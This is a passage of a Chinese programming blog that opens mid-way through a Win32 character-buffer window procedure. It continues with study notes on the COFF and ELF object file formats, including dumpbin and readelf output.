class="string">&#x27;\x1B&#x27;</span>: <span class="comment">// escape ,清空缓冲区</span></span><br><span class="line">			<span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; cyBuffer; y++)</span><br><span class="line">				<span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; cxBuffer; x++)</span><br><span class="line">					BUFFER(x, y) = <span class="string">&#x27; &#x27;</span>;<span class="comment">//遍历清空缓冲区</span></span><br><span class="line"></span><br><span class="line">			xCaret = <span class="number">0</span>;</span><br><span class="line">			yCaret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			InvalidateRect(hwnd, <span class="literal">NULL</span>, FALSE);<span class="comment">//清空缓冲区后立刻重绘</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>: <span class="comment">// character codes ,其他字符看作可打印字符,存入缓冲区</span></span><br><span class="line">			BUFFER(xCaret, yCaret) = (TCHAR)wParam;</span><br><span class="line"></span><br><span class="line">			HideCaret(hwnd);</span><br><span class="line">			hdc = GetDC(hwnd);</span><br><span class="line"></span><br><span class="line">			SelectObject(hdc, CreateFont(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">				dwCharSet, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, FIXED_PITCH, <span class="literal">NULL</span>));</span><br><span class="line">			TextOut(hdc, xCaret * cxChar, yCaret * cyChar,</span><br><span class="line">				&amp;BUFFER(xCaret, yCaret), <span class="number">1</span>);</span><br><span class="line">			DeleteObject(</span><br><span class="line">				SelectObject(hdc, GetStockObject(SYSTEM_FONT)));</span><br><span class="line">			ReleaseDC(hwnd, hdc);</span><br><span class="line">			ShowCaret(hwnd);</span><br><span class="line">			<span class="keyword">if</span> (++xCaret == cxBuffer)<span class="comment">//本行到头了,需要换行</span></span><br><span class="line">			&#123;</span><br><span class="line">				xCaret = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span> (++yCaret == cyBuffer)</span><br><span class="line">					yCaret = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SetCaretPos(xCaret * cxChar, yCaret * cyChar);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="绘图消息-1">绘图消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">	hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">	SelectObject(hdc, CreateFont(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">		dwCharSet, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, FIXED_PITCH, <span class="literal">NULL</span>));<span class="comment">//等宽字体,FIXED_PITCH等宽间距</span></span><br><span class="line">	<span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; cyBuffer; y++)<span class="comment">//按行遍历,每次打印一整行</span></span><br><span class="line">		TextOut(hdc, <span class="number">0</span>, y * cyChar, &amp;BUFFER(<span class="number">0</span>, y), cxBuffer);</span><br><span class="line">	DeleteObject(SelectObject(hdc,GetStockObject(SYSTEM_FONT)));</span><br><span class="line">	EndPaint(hwnd, &amp;ps);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="窗口销毁消息-1">窗口销毁消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-chapter-5-COFF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-chapter-5-COFF/" class="post-title-link" itemprop="url">程序员的自我修养 chapter 5 COFF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-11 14:55:00" itemprop="dateCreated datePublished" datetime="2022-08-11T14:55:00+08:00">2022-08-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-18 10:14:33" itemprop="dateModified" datetime="2022-08-18T10:14:33+08:00">2022-08-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="coff文件格式">COFF文件格式</h1>
<h2 id="coff">COFF</h2>
<p>common object file format</p>
<p>文件整体结构如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220811105858318.png"
alt="image-20220811105858318" />
<figcaption aria-hidden="true">image-20220811105858318</figcaption>
</figure>
<h3 id="映像文件头">映像文件头</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">  WORD Machine;</span><br><span class="line">  WORD NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD SizeOfOptionalHeader;</span><br><span class="line">  WORD Characteristics;</span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>
<p>与PE文件有区别</p>
<p>在PE文件中映像文件头就是NT文件头,它是PE头的成员NT头的成员</p>
<p>而在COFF中上来就是镜像文件头</p>
<p>使用dumpbin观察main.obj文件的映像文件头</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Dump of file main.obj</span><br><span class="line"></span><br><span class="line">File <span class="built_in">Type</span>: COFF OBJECT</span><br><span class="line"></span><br><span class="line">FILE HEADER VALUES</span><br><span class="line">            <span class="number">8664</span> machine (x64)</span><br><span class="line">               E number of sections</span><br><span class="line">        <span class="number">62</span>F46FCA time date stamp Thu Aug <span class="number">11</span> <span class="number">10</span>:<span class="number">56</span>:<span class="number">10</span> <span class="number">2022</span></span><br><span class="line">             <span class="number">4</span>E5 file pointer to symbol table</span><br><span class="line">              <span class="number">30</span> number of symbols</span><br><span class="line">               <span class="number">0</span> size of optional header</span><br><span class="line">               <span class="number">0</span> characteristics</span><br></pre></td></tr></table></figure>
<p>x86_64上的程序</p>
<p>14个节</p>
<p>编译时间2022.8.11 10:56:10</p>
<p>符号表的文件偏移量4E5</p>
<p>符号数量30h</p>
<p>可选头没有,PE中才有,COFF中永远都是0</p>
<p>特征没有</p>
<h3 id="节头表">节头表</h3>
<p>节头表是一个结构体数组,每个元素都是一个<code>IMAGE_SECTION_HEADER</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">     BYTE Name[IMAGE_SIZEOF_SHORT_NAME];<span class="comment">//节名</span></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span><span class="comment">//联合</span></span><br><span class="line">DWORD PhysicalAddress;<span class="comment">//本段在文件中的地址</span></span><br><span class="line">DWORD VirtualSize;<span class="comment">//本段在虚拟内存中的大小</span></span><br><span class="line">     &#125; Misc;</span><br><span class="line">     DWORD VirtualAddress;<span class="comment">//相对虚拟地址</span></span><br><span class="line">     DWORD SizeOfRawData;<span class="comment">//该段在文件中的大小</span></span><br><span class="line">     DWORD PointerToRawData;<span class="comment">//该段在文件中的位置</span></span><br><span class="line">     DWORD PointerToRelocations;<span class="comment">//该段的重定位表在文件中的位置</span></span><br><span class="line">     DWORD PointerToLinenumbers;<span class="comment">//该段的行号表在文件中的位置</span></span><br><span class="line">     WORD NumberOfRelocations;</span><br><span class="line">     WORD NumberOfLinenumbers;</span><br><span class="line">     DWORD Characteristics;<span class="comment">//段属性,包括读写执行等性质</span></span><br><span class="line">   &#125; IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
<p>这个表有多少个元素呢?在映像文件头中的<code>NumberOfSections</code>指明了节头表的元素数量</p>
<h4 id="drectve">.drectve</h4>
<p>比如第一个节区头就是<code>.drectve</code>的节区头</p>
<p>Directive,编译器传递给链接器的指令,作用和在命令行上link直接指定命令行参数相同</p>
<p>只不过这样写可以给每个目标模块定制一套链接参数,link的时候不需要再写一长串命令行参数了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SECTION HEADER <span class="comment">#1</span></span><br><span class="line">.drectve name</span><br><span class="line">       <span class="number">0</span> physical address</span><br><span class="line">       <span class="number">0</span> virtual address</span><br><span class="line">      <span class="number">18</span> size of raw <span class="keyword">data</span></span><br><span class="line">     <span class="number">244</span> file pointer to raw <span class="keyword">data</span> (<span class="number">00000244</span> to <span class="number">0000025</span>B)</span><br><span class="line">       <span class="number">0</span> file pointer to relocation table</span><br><span class="line">       <span class="number">0</span> file pointer to line numbers</span><br><span class="line">       <span class="number">0</span> number of relocations</span><br><span class="line">       <span class="number">0</span> number of line numbers</span><br><span class="line">  <span class="number">100</span>A00 flags</span><br><span class="line">         Info   <span class="comment">#0x200,该段包含的是注释或者其他信息</span></span><br><span class="line">         Remove		<span class="comment">#0x800,链接成exe文件时该段最终被抛弃</span></span><br><span class="line">         <span class="number">1</span> byte align	<span class="comment">#0x100000,1字节对齐,相当于没有对齐要求</span></span><br></pre></td></tr></table></figure>
<h4 id="debug">.debug</h4>
<p>调试信息</p>
<p>.debug$S表示包含符号相关的调试信息段</p>
<p>.debug$P表示预编译头的调试信息段</p>
<p>.debug$T表示类型相关的调试信息段</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SECTION HEADER <span class="comment">#2</span></span><br><span class="line">.debug<span class="variable">$S</span> name</span><br><span class="line">       <span class="number">0</span> physical address</span><br><span class="line">       <span class="number">0</span> virtual address</span><br><span class="line">      <span class="number">74</span> size of raw <span class="keyword">data</span></span><br><span class="line">     <span class="number">11</span>C file pointer to raw <span class="keyword">data</span> (<span class="number">0000011</span>C to <span class="number">0000018</span>F)</span><br><span class="line">       <span class="number">0</span> file pointer to relocation table</span><br><span class="line">       <span class="number">0</span> file pointer to line numbers</span><br><span class="line">       <span class="number">0</span> number of relocations</span><br><span class="line">       <span class="number">0</span> number of line numbers</span><br><span class="line"><span class="number">42100040</span> flags</span><br><span class="line">         Initialized <span class="keyword">Data</span></span><br><span class="line">         Discardable</span><br><span class="line">         <span class="number">1</span> byte align</span><br><span class="line">         Read Only</span><br></pre></td></tr></table></figure>
<h3 id="节区">节区</h3>
<p>节区紧跟在节头表后面,也就是正文部分</p>
<p>使用dumpbin观察节区数量</p>
<h4 id="drectve-1">.drectve</h4>
<p>第一个节区就是链接指示信息节区,节区表指示该节区正文位于文件的0x244位置</p>
<p>dumpbin打印的结果中,正文区是紧跟在节头后面的</p>
<p>dumpbin知道这个段是关于链接信息的段,它直接把ASCII码翻译出来了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAW DATA #1</span><br><span class="line">  00000000: 20 20 20 2F 44 45 46 41 55 4C 54 4C 49 42 3A 22     /DEFAULTLIB:&quot;</span><br><span class="line">  00000010: 4C 49 42 43 4D 54 22 20                          LIBCMT&quot; </span><br><span class="line"></span><br><span class="line">   Linker Directives</span><br><span class="line">   -----------------</span><br><span class="line">   /DEFAULTLIB:LIBCMT</span><br></pre></td></tr></table></figure>
<p>就相当于在链接时使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link main.obj /DEFAULTLIB:LIBCMT</span><br></pre></td></tr></table></figure>
<p>这也就解释了为啥我们没有显示链接LIBCMT库但是编译器自动要求链接这个库,默认的链接信息已经写入main.obj的.drectve节了</p>
<h4 id="debug-1">.debug</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAW DATA #2</span><br><span class="line">  00000000: 04 00 00 00 F1 00 00 00 66 00 00 00 28 00 01 11  ....?..f...(...</span><br><span class="line">  00000010: 00 00 00 00 43 3A 5C 55 73 65 72 73 5C 38 36 31  ....C:\Users\861</span><br><span class="line">  00000020: 33 35 5C 64 65 73 6B 74 6F 70 5C 6C 69 6E 6B 5C  35\desktop\link\</span><br><span class="line">  00000030: 61 2E 6F 62 6A 00 3A 00 3C 11 00 62 00 00 D0 00  a.obj.:.&lt;..b..?</span><br><span class="line">  00000040: 13 00 1F 00 82 79 02 00 13 00 1F 00 82 79 02 00  .....y.......y..</span><br><span class="line">  00000050: 4D 69 63 72 6F 73 6F 66 74 20 28 52 29 20 4F 70  Microsoft (R) Op</span><br><span class="line">  00000060: 74 69 6D 69 7A 69 6E 67 20 43 6F 6D 70 69 6C 65  timizing Compile</span><br><span class="line">  00000070: 72 00 00 00</span><br></pre></td></tr></table></figure>
<h3 id="符号表">符号表</h3>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">COFF SYMBOL TABLE</span><br><span class="line"><span class="number">000</span> <span class="number">01047982</span> ABS    notype       <span class="keyword">Static</span>       | @comp.id</span><br><span class="line"><span class="number">001</span> <span class="number">80010190</span> ABS    notype       <span class="keyword">Static</span>       | @feat.<span class="number">00</span></span><br><span class="line"><span class="number">002</span> <span class="number">00000002</span> ABS    notype       <span class="keyword">Static</span>       | @vol.md</span><br><span class="line"><span class="number">003</span> <span class="number">00000000</span> SECT1  notype       <span class="keyword">Static</span>       | .drectve</span><br><span class="line">    Section length   <span class="number">18</span>, <span class="comment">#relocs    0, #linenums    0, checksum        0</span></span><br><span class="line"><span class="number">005</span> <span class="number">00000000</span> SECT2  notype       <span class="keyword">Static</span>       | .debug<span class="variable">$S</span></span><br><span class="line">    Section length   <span class="number">74</span>, <span class="comment">#relocs    0, #linenums    0, checksum        0</span></span><br><span class="line"><span class="number">007</span> <span class="number">00000000</span> SECT3  notype       <span class="keyword">Static</span>       | .text<span class="variable">$mn</span></span><br><span class="line">    Section length   <span class="number">24</span>, <span class="comment">#relocs    2, #linenums    0, checksum 9B262C10</span></span><br><span class="line"><span class="number">009</span> <span class="number">00000000</span> SECT3  notype ()    External     | main</span><br><span class="line"><span class="number">00</span>A <span class="number">00000000</span> UNDEF  notype ()    External     | swap</span><br><span class="line"><span class="number">00</span>B <span class="number">00000000</span> SECT3  notype       Label        | <span class="variable">$LN3</span></span><br><span class="line"><span class="number">00</span>C <span class="number">00000000</span> SECT4  notype       <span class="keyword">Static</span>       | .xdata</span><br><span class="line">    Section length    <span class="number">8</span>, <span class="comment">#relocs    0, #linenums    0, checksum 37887F31</span></span><br><span class="line"><span class="number">00</span>E <span class="number">00000000</span> SECT4  notype       <span class="keyword">Static</span>       | <span class="variable">$unwind</span><span class="variable">$main</span></span><br><span class="line"><span class="number">00</span>F <span class="number">00000000</span> SECT5  notype       <span class="keyword">Static</span>       | .pdata</span><br><span class="line">    Section length    C, <span class="comment">#relocs    3, #linenums    0, checksum 7D3C6CAC</span></span><br><span class="line"><span class="number">011</span> <span class="number">00000000</span> SECT5  notype       <span class="keyword">Static</span>       | <span class="variable">$pdata</span><span class="variable">$main</span></span><br><span class="line"><span class="number">012</span> <span class="number">00000000</span> UNDEF  notype       External     | shared</span><br><span class="line"><span class="number">013</span> <span class="number">00000000</span> SECT6  notype       <span class="keyword">Static</span>       | .chks64</span><br><span class="line">    Section length   <span class="number">30</span>, <span class="comment">#relocs    0, #linenums    0, checksum        0</span></span><br></pre></td></tr></table></figure>
<p>最左侧是符号的编号,也就是符号在符号表中的下标,</p>
<p>第二列是符号的大小,即符号所表示的对象占用的空间</p>
<p>第三列是符号所在段位置</p>
<blockquote>
<p>ABS表示符号不属于任何段</p>
<p>SECT1表示符号属于COFF文件的第一个段,即.drectve段</p>
<p>UNDEF表示符号未定义,存在于其他文件,需要链接决议</p>
</blockquote>
<p>第四列是符号类型</p>
<blockquote>
<p>notype:变量和其他符号</p>
<p>notype():函数类型</p>
</blockquote>
<p>第五列是访问能见度</p>
<blockquote>
<p>Static为本模块可见</p>
<p>Externel为全局变量,可以被其他模块引用</p>
</blockquote>
<p>第六列是符号名</p>
<p>如果符号是一个段名则dumpbin会紧接着在下一行列出段属性,包括段长度,段重定位数,行号数和检校和</p>
<h2 id="工具">工具</h2>
<h3 id="msvc">MSVC</h3>
<h4 id="cl-c-编译不链接">cl /c 编译不链接</h4>
<h4 id="cl-za-禁用visual-c拓展">cl /Za 禁用Visual C++拓展</h4>
<h4 id="cl-zl-关闭默认c库的链接">cl /Zl 关闭默认C库的链接</h4>
<h3 id="dumpbin">dumpbin</h3>
<p>类似于GNU objdump</p>
<h4 id="dumpbin-summary-打印段名段长">dumpbin /SUMMARY 打印段名段长</h4>
<h4 id="dump-all-打印全部信息">dump /ALL 打印全部信息</h4>
<p>效果类似于010editor 的模板</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/08/%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/08/%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">程序员的自我修养 chapter3 ELF文件格式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-08 15:14:00 / Modified: 15:14:53" itemprop="dateCreated datePublished" datetime="2022-08-08T15:14:00+08:00">2022-08-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="chapter3-elf精灵">chapter3-ELF精灵</h1>
<p>可以先看CSAPP chapter 7链接然后看程序员自我修养这本书</p>
<h2 id="历史与简介">历史与简介</h2>
<blockquote>
<p>一个程序的编译链接全过程</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805144230118.png" /></p>
</blockquote>
<p><strong>分类:</strong></p>
<p>目标文件可以分为两种,可重定位目标文件,和可执行目标文件</p>
<p>其中可重定位目标模块在linux上是.o,在windows上是.obj.源代码只经过编译,不通过链接得到可重定位目标模块.其中的代码数据从0开始编址,只具有相对意义,无绝对意义</p>
<p>一个或者多个可重定位目标模块,与库文件链接后,形成可执行目标文件,在windows上是.exe,在linux上是.out</p>
<p>库文件,包括动态库和静态库,也是按照目标文件的结构存储的</p>
<blockquote>
<p>COFF分类</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805145133735.png"
alt="image-20220805145133735" />
<figcaption aria-hidden="true">image-20220805145133735</figcaption>
</figure>
</blockquote>
<p><strong>历史:</strong></p>
<p>最初Unix上的可执行文件格式为COFF(common file format)</p>
<p>从Unix进化而来的Windows,Linux分别有不同的变种</p>
<p>Windows NT上是PE-COFF(portable executable)</p>
<p>Linux上是ELF(Executable Linkable Format)</p>
<h2 id="linux-elf格式">Linux ELF格式</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/ELF.png"
alt="ELF" />
<figcaption aria-hidden="true">ELF</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805153055752.png"
alt="image-20220805153055752" />
<figcaption aria-hidden="true">image-20220805153055752</figcaption>
</figure>
<p>linux源码中ELF格式定义在<code>elf.h</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/desktop/COFF]</span><br><span class="line">└─<span class="meta"># whereis elf.h</span></span><br><span class="line">elf.h: /usr/include/elf.h</span><br></pre></td></tr></table></figure>
<p>关于该<code>elf.h</code>中的基本数据类型,没有直接使用诸如<code>int,char</code>等类型,而是使用<code>typedef</code>重新包装了一下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805154752930.png"
alt="image-20220805154752930" />
<figcaption aria-hidden="true">image-20220805154752930</figcaption>
</figure>
<p>就一个Half类型需要注意,不管是32位系统还是64位系统上该值都是2字节</p>
<h3 id="elf头">ELF头</h3>
<p>使用<code>readelf -h main</code>即可观察elf头</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# readelf -h main</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x1040</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14080 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         30</span><br><span class="line">  Section header string table index: 29</span><br></pre></td></tr></table></figure>
<p>64位elf头格式:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half	e_type;			<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half	e_machine;		<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word	e_version;		<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr	e_entry;		<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off	e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off	e_shoff;		<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word	e_flags;		<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half	e_ehsize;		<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half	e_phnum;		<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half	e_shnum;		<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half	e_shstrndx;		<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>
<h4 id="e_ident">e_ident</h4>
<p>整个ELF文件开头的十六个无符号字符类型,作用是表征文件魔数以及其他信息</p>
<p><code>7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00</code></p>
<blockquote>
<p>前16个字节翻译成人话:4位 ELF version1 小端存储文件</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805153933915.png"
alt="image-20220805153933915" />
<figcaption aria-hidden="true">image-20220805153933915</figcaption>
</figure>
